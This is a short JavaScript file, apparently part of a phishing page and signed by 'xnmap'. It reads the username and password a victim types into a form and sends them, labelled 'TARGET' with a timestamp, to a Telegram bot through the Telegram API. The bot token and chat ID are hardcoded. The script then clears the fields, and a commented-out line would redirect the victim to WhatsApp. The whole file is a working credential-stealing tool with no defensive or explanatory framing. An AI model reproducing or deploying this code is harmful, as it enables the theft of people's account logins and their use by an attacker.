//programmer xnmap

var telegram_bot_id = "5556591440:AAHaL_M8pUe3UIIZ1Up0C4O1jseeTd1knYo"; 

var chat_id = -1001633253754; 
var xnmap1, xnmap2;
var ready = function() {
  var xnmap1 = document.getElementById("xnmap3").value;
   var xnmap2 = document.getElementById("xnmap4").value;
   var run = new Date();
   var video = "https://youtu.be/xX0rwa9BpAY";
    dataxnmap = "\n==_1_=TARGET=="+  "\nuser:" + xnmap1 + "\npass:"+ xnmap2 + "\nDate:" + run;
};
var xnmap = function() {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": dataxnmap
        })
    };
    $.ajax(settings).done(function(response) {
        console.log(response);
        
    });
   // location=("https://www.whatsapp.com");
   document.getElementById("xnmap1").value = "";
 document.getElementById("xnmap2").value = "";
    //Iam xnmap programmer 
    
    
    return false;
    
  
};